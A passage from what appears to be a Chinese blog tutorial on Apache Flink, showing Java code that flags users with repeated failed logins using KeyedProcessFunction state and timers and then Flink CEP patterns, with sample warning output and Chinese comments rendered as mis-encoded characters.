<span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      loginFailEventListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;LoginEvent&gt;(<span class="string">&quot;login-fail-list&quot;</span>, LoginEvent.class));</span><br><span class="line">      timerTsState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;timer-ts&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(LoginEvent value, Context ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// åˆ¤æ–­å½“å‰ç™»å½•äº‹ä»¶ç±»å‹</span></span><br><span class="line">      <span class="keyword">if</span>( <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState()) )&#123;</span><br><span class="line">        <span class="comment">// 1. å¦‚æœæ˜¯å¤±è´¥äº‹ä»¶ï¼Œæ·»åŠ åˆ°åˆ—è¡¨çŠ¶æ€ä¸­</span></span><br><span class="line">        loginFailEventListState.add(value);</span><br><span class="line">        <span class="comment">// å¦‚æœæ²¡æœ‰å®šæ—¶å™¨ï¼Œæ³¨å†Œä¸€ä¸ª2ç§’ä¹‹åçš„å®šæ—¶å™¨</span></span><br><span class="line">        <span class="keyword">if</span>( timerTsState.value() == <span class="keyword">null</span> )&#123;</span><br><span class="line">          Long ts = (value.getTimestamp() + <span class="number">2</span>) * <span class="number">1000L</span>;</span><br><span class="line">          ctx.timerService().registerEventTimeTimer(ts);</span><br><span class="line">          timerTsState.update(ts);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 2. å¦‚æœæ˜¯ç™»å½•æˆåŠŸï¼Œåˆ é™¤å®šæ—¶å™¨ï¼Œæ¸…ç©ºçŠ¶æ€ï¼Œé‡æ–°å¼€å§‹</span></span><br><span class="line">        <span class="keyword">if</span>( timerTsState.value() != <span class="keyword">null</span> )</span><br><span class="line">          ctx.timerService().deleteEventTimeTimer(timerTsState.value());</span><br><span class="line">        loginFailEventListState.clear();</span><br><span class="line">        timerTsState.clear();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å®šæ—¶å™¨è§¦å‘ï¼Œè¯´æ˜2ç§’å†…æ²¡æœ‰ç™»å½•æˆåŠŸæ¥ï¼Œåˆ¤æ–­ListStateä¸­å¤±è´¥çš„ä¸ªæ•°</span></span><br><span class="line">      ArrayList&lt;LoginEvent&gt; loginFailEvents = Lists.newArrayList(loginFailEventListState.get().iterator());</span><br><span class="line">      Integer failTimes = loginFailEvents.size();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>( failTimes &gt;= maxFailTimes )&#123;</span><br><span class="line">        <span class="comment">// å¦‚æœè¶…å‡ºè®¾å®šçš„æœ€å¤§å¤±è´¥æ¬¡æ•°ï¼Œè¾“å‡ºæŠ¥è­¦</span></span><br><span class="line">        out.collect( <span class="keyword">new</span> LoginFailWarning(ctx.getCurrentKey(),</span><br><span class="line">                                          loginFailEvents.get(<span class="number">0</span>).getTimestamp(),</span><br><span class="line">                                          loginFailEvents.get(failTimes - <span class="number">1</span>).getTimestamp(),</span><br><span class="line">                                          <span class="string">&quot;login fail in 2s for &quot;</span> + failTimes + <span class="string">&quot; times&quot;</span>) );</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">      loginFailEventListState.clear();</span><br><span class="line">      timerTsState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰KeyedProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailDetectWarning</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">LoginEvent</span>, <span class="title">LoginFailWarning</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰å±æ€§ï¼Œæœ€å¤§è¿ç»­ç™»å½•å¤±è´¥æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">private</span> Integer maxFailTimes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoginFailDetectWarning</span><span class="params">(Integer maxFailTimes)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.maxFailTimes = maxFailTimes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼šä¿å­˜2ç§’å†…æ‰€æœ‰çš„ç™»å½•å¤±è´¥äº‹ä»¶</span></span><br><span class="line">    ListState&lt;LoginEvent&gt; loginFailEventListState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      loginFailEventListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;LoginEvent&gt;(<span class="string">&quot;login-fail-list&quot;</span>, LoginEvent.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»¥ç™»å½•äº‹ä»¶ä½œä¸ºåˆ¤æ–­æŠ¥è­¦çš„è§¦å‘æ¡ä»¶ï¼Œä¸å†æ³¨å†Œå®šæ—¶å™¨</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(LoginEvent value, Context ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// åˆ¤æ–­å½“å‰äº‹ä»¶ç™»å½•çŠ¶æ€</span></span><br><span class="line">      <span class="keyword">if</span>( <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState()) )&#123;</span><br><span class="line">        <span class="comment">// 1. å¦‚æœæ˜¯ç™»å½•å¤±è´¥ï¼Œè·å–çŠ¶æ€ä¸­ä¹‹å‰çš„ç™»å½•å¤±è´¥äº‹ä»¶ï¼Œç»§ç»­åˆ¤æ–­æ˜¯å¦å·²æœ‰å¤±è´¥äº‹ä»¶</span></span><br><span class="line">        Iterator&lt;LoginEvent&gt; iterator = loginFailEventListState.get().iterator();</span><br><span class="line">        <span class="keyword">if</span>( iterator.hasNext() )&#123;</span><br><span class="line">          <span class="comment">// 1.1 å¦‚æœå·²ç»æœ‰ç™»å½•å¤±è´¥äº‹ä»¶ï¼Œç»§ç»­åˆ¤æ–­æ—¶é—´æˆ³æ˜¯å¦åœ¨2ç§’ä¹‹å†…</span></span><br><span class="line">          <span class="comment">// è·å–å·²æœ‰çš„ç™»å½•å¤±è´¥äº‹ä»¶</span></span><br><span class="line">          LoginEvent firstFailEvent = iterator.next();</span><br><span class="line">          <span class="keyword">if</span>( value.getTimestamp() - firstFailEvent.getTimestamp() &lt;= <span class="number">2</span> )&#123;</span><br><span class="line">            <span class="comment">// 1.1.1 å¦‚æœåœ¨2ç§’ä¹‹å†…ï¼Œè¾“å‡ºæŠ¥è­¦</span></span><br><span class="line">            out.collect( <span class="keyword">new</span> LoginFailWarning(value.getUserId(), firstFailEvent.getTimestamp(), value.getTimestamp(), <span class="string">&quot;login fail 2 times in 2s&quot;</span>) );</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// ä¸ç®¡æŠ¥ä¸æŠ¥è­¦ï¼Œè¿™æ¬¡éƒ½å·²å¤„ç†å®Œæ¯•ï¼Œç›´æ¥æ›´æ–°çŠ¶æ€</span></span><br><span class="line">          loginFailEventListState.clear();</span><br><span class="line">          loginFailEventListState.add(value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 1.2 å¦‚æœæ²¡æœ‰ç™»å½•å¤±è´¥ï¼Œç›´æ¥å°†å½“å‰äº‹ä»¶å­˜å…¥ListState</span></span><br><span class="line">          loginFailEventListState.add(value);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 2. å¦‚æœæ˜¯ç™»å½•æˆåŠŸï¼Œç›´æ¥æ¸…ç©ºçŠ¶æ€</span></span><br><span class="line">        loginFailEventListState.clear();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoginFailWarning&#123;userId=1035, firstFailTime=1558430842, lastFailTime=1558430843, warningMsg=&#x27;login fail 2 times in 2s&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=1035, firstFailTime=1558430843, lastFailTime=1558430844, warningMsg=&#x27;login fail 2 times in 2s&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 3-CEPä»£ç å®ç°"><a href="#ä»£ç 3-CEPä»£ç å®ç°" class="headerlink" title="ä»£ç 3-CEPä»£ç å®ç°"></a>ä»£ç 3-CEPä»£ç å®ç°</h6><ul><li><p> pomä¾èµ–<br>CEPç¼–ç¨‹  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-cep_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.LoginEvent;</span><br><span class="line"><span class="keyword">import</span> beans.LoginFailWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.CEP;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternSelectFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.Pattern;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.conditions.SimpleCondition;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 3:41 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailWithCep</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    URL resource = LoginFail.class.getResource(<span class="string">&quot;/LoginLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;LoginEvent&gt; loginEventStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;LoginEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(LoginEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. å®šä¹‰ä¸€ä¸ªåŒ¹é…æ¨¡å¼</span></span><br><span class="line">    <span class="comment">// firstFail -&gt; secondFail, within 2s</span></span><br><span class="line">    Pattern&lt;LoginEvent, LoginEvent&gt; loginFailPattern = Pattern</span><br><span class="line">      .&lt;LoginEvent&gt;begin(<span class="string">&quot;firstFail&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;LoginEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(LoginEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      .next(<span class="string">&quot;secondFail&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;LoginEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(LoginEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      .within(Time.seconds(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. å°†åŒ¹é…æ¨¡å¼åº”ç”¨åˆ°æ•°æ®æµä¸Šï¼Œå¾—åˆ°ä¸€ä¸ªpattern stream</span></span><br><span class="line">    PatternStream&lt;LoginEvent&gt; patternStream = CEP.pattern(loginEventStream.keyBy(LoginEvent::getUserId), loginFailPattern);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. æ£€å‡ºç¬¦åˆåŒ¹é…æ¡ä»¶çš„å¤æ‚äº‹ä»¶ï¼Œè¿›è¡Œè½¬æ¢å¤„ç†ï¼Œå¾—åˆ°æŠ¥è­¦ä¿¡æ¯</span></span><br><span class="line">    SingleOutputStreamOperator&lt;LoginFailWarning&gt; warningStream = patternStream.select(<span class="keyword">new</span> LoginFailMatchDetectWarning());</span><br><span class="line"></span><br><span class="line">    warningStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;login fail detect with cep job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„PatternSelectFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailMatchDetectWarning</span> <span class="keyword">implements</span> <span class="title">PatternSelectFunction</span>&lt;<span class="title">LoginEvent</span>, <span class="title">LoginFailWarning</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LoginFailWarning <span class="title">select</span><span class="params">(Map&lt;String, List&lt;LoginEvent&gt;&gt; pattern)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      LoginEvent firstFailEvent = pattern.get(<span class="string">&quot;firstFail&quot;</span>).iterator().next();</span><br><span class="line">      LoginEvent lastFailEvent = pattern.get(<span class="string">&quot;secondFail&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> LoginFailWarning(firstFailEvent.getUserId(), firstFailEvent.getTimestamp(), lastFailEvent.getTimestamp(), <span class="string">&quot;login fail 2 times&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoginFailWarning&#123;userId=<span class="number">1035</span>, firstFailTime=<span class="number">1558430842</span>, lastFailTime=<span class="number">1558430843</span>, warningMsg=<span class="string">&#x27;login fail 2 times&#x27;</span>&#125;</span><br><span class="line">LoginFailWarning&#123;userId=<span class="number">1035</span>, firstFailTime=<span class="number">1558430843</span>, lastFailTime=<span class="number">1558430844</span>, warningMsg=<span class="string">&#x27;login fail 2 times&#x27;</span>&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 4-CEPåˆ©ç”¨å¾ªç¯æ¨¡å¼ä¼˜åŒ–"><a href="#ä»£ç 4-CEPåˆ©ç”¨å¾ªç¯æ¨¡å¼ä¼˜åŒ–" class="headerlink" title="ä»£ç 4-CEPåˆ©ç”¨å¾ªç¯æ¨¡å¼ä¼˜åŒ–"></a>ä»£ç 4-CEPåˆ©ç”¨å¾ªç¯æ¨¡å¼ä¼˜åŒ–</h6><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.LoginEvent;</span><br><span class="line"><span class="keyword">import</span> beans.LoginFailWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.CEP;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternSelectFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.Pattern;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.conditions.SimpleCondition;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 3:41 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailWithCep</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®</span></span><br><span class="line">    URL resource = LoginFail.class.getResource(<span class="string">&quot;/LoginLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;LoginEvent&gt; loginEventStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;LoginEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(LoginEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. å®šä¹‰ä¸€ä¸ªåŒ¹é…æ¨¡å¼</span></span><br><span class="line">    <span class="comment">// firstFail -&gt; secondFail, within 2s</span></span><br><span class="line">    Pattern&lt;LoginEvent, LoginEvent&gt; loginFailPattern = Pattern</span><br><span class="line">      .&lt;LoginEvent&gt;begin(<span class="string">&quot;failEvents&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;LoginEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(LoginEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;).times(<span class="number">3</span>).consecutive()</span><br><span class="line">      .within(Time.seconds(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. å°†åŒ¹é…æ¨¡å¼åº”ç”¨åˆ°æ•°æ®æµä¸Šï¼Œå¾—åˆ°ä¸€ä¸ªpattern stream</span></span><br><span class="line">    PatternStream&lt;LoginEvent&gt; patternStream = CEP.pattern(loginEventStream.keyBy(LoginEvent::getUserId), loginFailPattern);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. æ£€å‡ºç¬¦åˆåŒ¹é…æ¡ä»¶çš„å¤æ‚äº‹ä»¶ï¼Œè¿›è¡Œè½¬æ¢å¤„ç†ï¼Œå¾—åˆ°æŠ¥è­¦ä¿¡æ¯</span></span><br><span class="line">    SingleOutputStreamOperator&lt;LoginFailWarning&gt; warningStream = patternStream.select(<span class="keyword">new</span> LoginFailMatchDetectWarning());</span><br><span class="line"></span><br><span class="line">    warningStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;login fail detect with cep job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„PatternSelectFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailMatchDetectWarning</span> <span class="keyword">implements</span> <span class="title">PatternSelectFunction</span>&lt;<span class="title">LoginEvent</span>, <span 